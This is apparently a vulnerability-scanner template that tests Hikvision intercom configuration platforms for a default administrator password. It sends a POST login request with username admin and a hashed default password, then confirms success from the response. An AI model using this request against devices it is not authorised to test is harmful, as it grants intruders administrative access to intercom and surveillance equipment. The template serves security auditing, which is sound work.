{
    "Name": "hikvision-intercom-service-default-password",
    "Description": "海康威视对讲服务配置平台弱口令",
    "Product": "Hikvision",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/authorize.action",
        "Port":"",
        "Data":"username=admin&userpsw=827ccb0eea8a706c4c34a16891f84e7b&language=zh_cn",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "{\"success\": true, \"msg\": \"OK\"}                "
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}

